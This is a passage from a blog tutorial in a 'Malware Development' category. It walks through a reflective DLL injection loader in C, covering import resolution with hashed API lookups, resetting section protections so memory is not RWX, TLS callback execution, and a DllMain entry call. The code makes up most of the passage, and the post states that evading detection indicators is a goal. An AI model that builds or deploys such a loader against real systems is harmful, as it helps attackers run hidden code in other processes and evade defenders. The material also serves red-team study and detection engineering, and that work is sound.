    <span class="k">union</span> <span class="p">{</span>
        <span class="n">DWORD</span>   <span class="n">Characteristics</span><span class="p">;</span>
        <span class="n">DWORD</span>   <span class="n">OriginalFirstThunk</span><span class="p">;</span>
    <span class="p">}</span> <span class="n">DUMMYUNIONNAME</span><span class="p">;</span>
    <span class="n">DWORD</span>   <span class="n">TimeDateStamp</span><span class="p">;</span>
    <span class="n">DWORD</span>   <span class="n">ForwarderChain</span><span class="p">;</span>
    <span class="n">DWORD</span>   <span class="n">Name</span><span class="p">;</span>
    <span class="n">DWORD</span>   <span class="n">FirstThunk</span><span class="p">;</span>
<span class="p">}</span> <span class="n">IMAGE_IMPORT_DESCRIPTOR</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><ul><li>Name - DLL name that will be used as a parameter to get the module address.</li><li>FirstThunk - Structure where we will fill in the addresses of the functions.</li><li>OriginalFirstThunk - Structure that we will use to get the name/ordinal of the functions.</li></ul><p>The structure of FirstThunk and OriginalFirstThunk is IMAGE_THUNK_DATA, which will be demonstrated below:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre></td><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="nf">ResolveIat</span><span class="p">(</span> <span class="n">_In_</span> <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">pEntryImport</span><span class="p">,</span> <span class="n">_In_</span> <span class="n">DWORD64</span> <span class="n">NewImgAddr</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">PIMAGE_IMPORT_DESCRIPTOR</span> <span class="n">ImportDesc</span> <span class="o">=</span> <span class="n">NewImgAddr</span> <span class="o">+</span> <span class="n">pEntryImport</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">;</span>

	<span class="k">for</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">ImportDesc</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">;</span> <span class="n">ImportDesc</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

		<span class="n">PIMAGE_THUNK_DATA</span> <span class="n">IAT</span> <span class="o">=</span> <span class="n">NewImgAddr</span> <span class="o">+</span> <span class="n">ImportDesc</span><span class="o">-&gt;</span><span class="n">FirstThunk</span><span class="p">;</span>
		<span class="n">PIMAGE_THUNK_DATA</span> <span class="n">ILT</span> <span class="o">=</span> <span class="n">NewImgAddr</span> <span class="o">+</span> <span class="n">ImportDesc</span><span class="o">-&gt;</span><span class="n">OriginalFirstThunk</span><span class="p">;</span>

		<span class="n">PCHAR</span> <span class="n">DllName</span> <span class="o">=</span> <span class="n">NewImgAddr</span> <span class="o">+</span> <span class="n">ImportDesc</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">;</span>

		<span class="n">HMODULE</span> <span class="n">hDll</span> <span class="o">=</span> <span class="n">LdrModuleAddr</span><span class="p">(</span> <span class="n">CRC32B</span><span class="p">(</span><span class="n">DllName</span><span class="p">)</span> <span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hDll</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">hDll</span> <span class="o">=</span> <span class="n">LdrLib</span><span class="p">(</span> <span class="n">DllName</span> <span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hDll</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>

		<span class="k">for</span> <span class="p">(;</span> <span class="n">ILT</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span><span class="p">;</span> <span class="n">IAT</span><span class="o">++</span><span class="p">,</span> <span class="n">ILT</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

			<span class="k">if</span> <span class="p">(</span><span class="n">IMAGE_SNAP_BY_ORDINAL</span><span class="p">(</span><span class="n">ILT</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">))</span> <span class="p">{</span>

				<span class="n">LPCSTR</span> <span class="n">functionOrdinal</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">IMAGE_ORDINAL</span><span class="p">(</span><span class="n">ILT</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">);</span>
				<span class="n">IAT</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">hDll</span><span class="p">,</span> <span class="n">CRC32B</span><span class="p">(</span><span class="n">functionOrdinal</span><span class="p">));</span>

				<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">IAT</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span> <span class="p">){</span>
					<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
				<span class="p">}</span>

			<span class="p">}</span>
			<span class="k">else</span> <span class="p">{</span>

				<span class="n">IMAGE_IMPORT_BY_NAME</span><span class="o">*</span> <span class="n">Hint</span> <span class="o">=</span> <span class="n">NewImgAddr</span> <span class="o">+</span> <span class="n">ILT</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span><span class="p">;</span>
				<span class="n">IAT</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span> <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">hDll</span><span class="p">,</span> <span class="n">CRC32B</span><span class="p">(</span><span class="n">Hint</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">));</span>

				<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">IAT</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span> <span class="p">){</span>
					<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
				<span class="p">}</span>

			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
	
	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h2 id="re-define-memory-permissions"><span class="me-2">Re-Define Memory Permissions</span><a href="https://oblivion-malware.xyz/posts/reflective-dll-injection/#re-define-memory-permissions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If we were not to reset the memory permissions we would have to allocate with RWX which is a strong indicator, so it would end up looking like this in the memory mapping of the injected process:</p><p></p><p>Resetting permissions is very simple, we will perform a loop and make comparisons to find out what is the appropriate memory definition for each section and we will use the VirtualProtect API to correct them:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="k">for</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pImgNtHdrs</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>

<span class="n">DWORD</span>	<span class="n">dwProtection</span>	<span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
<span class="n">DWORD</span>	<span class="n">dwOldProtection</span>	<span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">SizeOfRawData</span> <span class="o">||</span> <span class="o">!</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">VirtualAddress</span> <span class="p">)</span>
    <span class="k">continue</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span> <span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_WRITE</span> <span class="p">)</span>
    <span class="n">dwProtection</span> <span class="o">=</span> <span class="n">PAGE_WRITECOPY</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span> <span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_READ</span> <span class="p">)</span>
    <span class="n">dwProtection</span> <span class="o">=</span> <span class="n">PAGE_READONLY</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span> <span class="p">(</span> <span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_WRITE</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_READ</span><span class="p">))</span>
    <span class="n">dwProtection</span> <span class="o">=</span> <span class="n">PAGE_READWRITE</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_EXECUTE</span><span class="p">)</span>
    <span class="n">dwProtection</span> <span class="o">=</span> <span class="n">PAGE_EXECUTE</span><span class="p">;</span>

<span class="k">if</span> <span class="p">((</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_EXECUTE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_WRITE</span><span class="p">))</span>
    <span class="n">dwProtection</span> <span class="o">=</span> <span class="n">PAGE_EXECUTE_WRITECOPY</span><span class="p">;</span>

<span class="k">if</span> <span class="p">((</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_EXECUTE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_READ</span><span class="p">))</span>
    <span class="n">dwProtection</span> <span class="o">=</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">;</span>

<span class="k">if</span> <span class="p">((</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_EXECUTE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_WRITE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_READ</span><span class="p">))</span>
    <span class="n">dwProtection</span> <span class="o">=</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">pVirtualProtect</span><span class="p">(</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">DllAddr</span> <span class="o">+</span> <span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="n">dwProtection</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><p>But with memory resets we can allocate it with RW and then we will reset each section with its memory properly, it looks like this:</p><p></p><h2 id="tls-callbacks-execution"><span class="me-2">TLS Callbacks Execution</span><a href="https://oblivion-malware.xyz/posts/reflective-dll-injection/#tls-callbacks-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The TLS Callback are functions executed before the entry point. Before running DLLMain, these callbacks must be executed. They can be found in the PE Data Directory Entry TLS.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="nf">ExecTls</span><span class="p">(</span> <span class="n">_In_</span> <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">pEntryTls</span><span class="p">,</span> <span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">DllAddr</span> <span class="p">){</span>
	
	<span class="n">PIMAGE_TLS_CALLBACK</span> <span class="o">*</span><span class="n">TlsCallback</span><span class="p">;</span>
	
	<span class="k">if</span><span class="p">(</span><span class="n">pEntryTls</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">)</span> <span class="p">{</span>
	
		<span class="n">PIMAGE_TLS_DIRECTORY</span> <span class="n">TlsDir</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_TLS_DIRECTORY</span><span class="p">)(</span> <span class="n">U_PTR</span><span class="p">(</span><span class="n">DllAddr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pEntryTls</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">);</span>
		<span class="n">TlsCallback</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_TLS_CALLBACK</span> <span class="o">*</span><span class="p">)(</span><span class="n">TlsDir</span><span class="o">-&gt;</span><span class="n">AddressOfCallBacks</span><span class="p">);</span>
		<span class="k">for</span><span class="p">(</span> <span class="p">;</span> <span class="o">*</span><span class="n">TlsCallback</span><span class="p">;</span> <span class="n">TlsCallback</span><span class="o">++</span> <span class="p">)</span>
			<span class="p">(</span><span class="o">*</span><span class="n">TlsCallback</span><span class="p">)((</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">DllAddr</span><span class="p">,</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h2 id="execute-dllmain-entrypoint"><span class="me-2">Execute DllMain EntryPoint</span><a href="https://oblivion-malware.xyz/posts/reflective-dll-injection/#execute-dllmain-entrypoint" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now we can get the Dll’s entrypoint, which is DllMain, and return the execution flow to it, but first we will clear the instruction caches with NtFlushInstructionCache.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">pNtFlushInstructionCache</span><span class="p">(</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span> <span class="p">);</span>

<span class="n">ExecTls</span><span class="p">(</span> <span class="n">pEntryTls</span><span class="p">,</span> <span class="n">DllAddr</span> <span class="p">);</span>

<span class="n">ULONG_PTR</span> <span class="n">EntryPoint</span> <span class="o">=</span> <span class="p">(</span> <span class="n">U_PTR</span><span class="p">(</span><span class="n">DllAddr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pImgNtHdrs</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span> <span class="p">);</span>

<span class="p">((</span><span class="n">fnDllMain</span><span class="p">)</span><span class="n">EntryPoint</span><span class="p">)(</span> <span class="p">(</span><span class="n">HINSTANCE</span><span class="p">)</span><span class="n">DllAddr</span><span class="p">,</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">,</span> <span class="n">lpParameter</span> <span class="p">);</span>

<span class="k">return</span> <span class="n">EntryPoint</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><h2 id="example-dllmain"><span class="me-2">Example DllMain</span><a href="https://oblivion-malware.xyz/posts/reflective-dll-injection/#example-dllmain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="cp">#define DLL_QUERY_HMODULE 6
</span><span class="n">hAppInstance</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="n">CHAR</span> <span class="n">hell</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'R'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'f'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'c'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">,</span> <span class="sc">' '</span><span class="p">,</span> <span class="sc">'B'</span><span class="p">,</span> <span class="sc">'y'</span><span class="p">,</span> <span class="sc">' '</span><span class="p">,</span> <span class="sc">'O'</span><span class="p">,</span> <span class="sc">'b'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'v'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">PCHAR</span> <span class="n">aaaa</span> <span class="o">=</span> <span class="s">"RDI"</span><span class="p">;</span>

    <span class="n">BOOL</span> <span class="n">bReturnValue</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
	<span class="k">switch</span><span class="p">(</span> <span class="n">dwReason</span> <span class="p">)</span> 
    <span class="p">{</span> 
		<span class="k">case</span> <span class="n">DLL_QUERY_HMODULE</span><span class="p">:</span>
			<span class="k">if</span><span class="p">(</span> <span class="n">lpReserved</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span>
				<span class="o">*</span><span class="p">(</span><span class="n">HMODULE</span> <span class="o">*</span><span class="p">)</span><span class="n">lpReserved</span> <span class="o">=</span> <span class="n">hAppInstance</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
			<span class="n">hAppInstance</span> <span class="o">=</span> <span class="n">hinstDLL</span><span class="p">;</span>
			<span class="n">MessageBoxA</span><span class="p">(</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">hell</span><span class="p">,</span> <span class="n">aaaa</span><span class="p">,</span> <span class="n">MB_OK</span> <span class="p">);</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
		<span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
	<span class="k">return</span> <span class="n">bReturnValue</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h1 id="observation">Observation</h1><p>There are two ways to perform RDI, which is using a function exported from a DLL or placing the reflection in the injector itself, in the context of this series we will use the DLL context to have a reflective exported function.</p><h1 id="how-inject-rdi">How Inject RDI</h1><p>I’m not going to include a code sample here, I’m just going to explain how it can be done. All the code shown previously is used within an exported function, and as soon as the code is executed, DllMain will be started, allowing something to be executed within DllMain being injected into a process. To perform the RDI injection using thread creation, it is necessary to the thread is started from this exported function. Then you will need to create the thread from the base address + offset of the exported function.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="https://oblivion-malware.xyz/categories/malware-development/">Malware Development</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 "><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Reflective%20DLL%20Injection%20-%20Oblivion&amp;url=%2Fposts%2Freflective-dll-injection%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Twitter" data-bs-original-title="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Reflective%20DLL%20Injection%20-%20Oblivion&amp;u=%2Fposts%2Freflective-dll-injection%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Facebook" data-bs-original-title="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Freflective-dll-injection%2F&amp;text=Reflective%20DLL%20Injection%20-%20Oblivion" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Telegram" data-bs-original-title="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" data-title-succeed="Link copied successfully!" data-bs-original-title="Copy link"> <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="https://oblivion-malware.xyz/tags/windows/">Windows</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>
</body></html>